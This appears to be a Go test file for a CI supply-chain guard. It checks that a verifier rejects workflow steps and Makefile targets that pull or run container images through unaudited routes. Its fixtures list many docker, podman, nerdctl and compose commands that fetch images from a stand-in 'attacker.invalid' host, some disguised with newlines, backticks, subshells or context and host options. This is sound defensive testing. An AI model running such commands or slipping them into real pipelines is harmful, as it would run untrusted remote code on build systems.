package releaseverify

import (
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

func TestVerifyCIContainerDownloadsRejectsContainerEngineGrammar(t *testing.T) {
	commands := map[string]string{
		"Docker image pull":         "docker image pull attacker.invalid/image:pinned",
		"Podman image pull":         "podman image pull attacker.invalid/image:pinned",
		"nerdctl image pull":        "nerdctl image pull attacker.invalid/image:pinned",
		"Docker container run":      "docker container run attacker.invalid/image:pinned",
		"Podman container create":   "podman container create attacker.invalid/image:pinned",
		"nerdctl direct create":     "nerdctl create attacker.invalid/image:pinned",
		"tab-separated image pull":  "docker\timage\tpull\tattacker.invalid/image:pinned",
		"logical image pull":        "true && podman image pull attacker.invalid/image:pinned",
		"nested image pull":         "image=$(nerdctl image pull attacker.invalid/image:pinned)",
		"backtick image pull":       "image=`docker image pull attacker.invalid/image:pinned`",
		"quoted nested image pull":  "sh -c 'podman image pull attacker.invalid/image:pinned'",
		"newline image pull":        "true\ndocker image pull attacker.invalid/image:pinned",
		"variable image pull":       `"${ENGINE}" image pull attacker.invalid/image:pinned`,
		"variable container create": `${ENGINE} container create attacker.invalid/image:pinned`,
		"Docker context equals":     `docker --context=attacker image pull attacker.invalid/image:pinned`,
		"Docker config separate":    `docker --config /tmp/attacker pull attacker.invalid/image:pinned`,
		"Docker host separate":      `docker --host "tcp://attacker" run attacker.invalid/image:pinned`,
		"Podman connection equals":  `podman --connection=attacker image pull attacker.invalid/image:pinned`,
		"Podman URL separate":       `podman --url "$PODMAN_URL" container run attacker.invalid/image:pinned`,
		"nerdctl namespace equals":  `nerdctl --namespace=attacker image pull attacker.invalid/image:pinned`,
		"nerdctl address separate":  `nerdctl --address "$ADDRESS" container create attacker.invalid/image:pinned`,
		"docker-compose options":    `docker-compose -p attacker -f attacker.yml up`,
		"Docker Compose options":    `docker compose -p attacker -f attacker.yml up`,
		"variable engine options":   `"${ENGINE}" --context="$CONTEXT" image pull attacker.invalid/image:pinned`,
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			workflow := "name: extra\non: push\njobs:\n  acquire:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + strconv.Quote(command) + "\n"
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an unaudited container-engine acquisition command")
			}
		})
	}

	for name, replacement := range map[string]string{
		"direct pull":        `docker image pull "$image"`,
		"option-hidden pull": `docker --context=attacker image pull "$image"`,
	} {
		t.Run("packaged image inspection cannot become "+name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			mutated := strings.Replace(packagedImageMetadataInspection, `container=$(docker create "$image")`, replacement, 1)
			workflow := "name: image\non: push\njobs:\n  inspect:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + strconv.Quote(mutated) + "\n"
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-image.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads widened the exact packaged-image inspection exception into a pull exception")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsExistingComposeMakeRoutes(t *testing.T) {
	for _, target := range []string{"dev", "dev-gpu"} {
		t.Run(target, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			build := `.PHONY: dev dev-gpu
dev:
	docker compose -p "$${COMPOSE_PROJECT_NAME}" -f docker/compose.dev.yaml up -d
dev-gpu:
	docker compose -p "$${COMPOSE_PROJECT_NAME}" -f docker/compose.dev.yaml -f docker/compose.dev.gpu.yaml up -d
inspect-image:
	docker --context=attacker image inspect loomarr-ci:verify
`
			writeFixtureFile(t, filepath.Join(root, "mk", "build.mk"), build)
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/build.mk\n")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: make `+target+"\n")
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an existing option-bearing Compose Make route")
			}
		})
	}

	t.Run("non-acquisition engine command still protects workflow route", func(t *testing.T) {
		root := writeCIContainerDownloadsFixture(t)
		writeFixtureFile(t, filepath.Join(root, "mk", "build.mk"), "inspect-image:\n\tdocker --context=attacker image inspect loomarr-ci:verify\n")
		makefilePath := filepath.Join(root, "Makefile")
		writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/build.mk\n")
		writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), "name: extra\non: push\njobs:\n  inspect:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make inspect-image\n")
		if err := VerifyCIContainerDownloads(root); err == nil {
			t.Fatal("VerifyCIContainerDownloads accepted an arbitrary workflow route to a container engine")
		}
	})
}
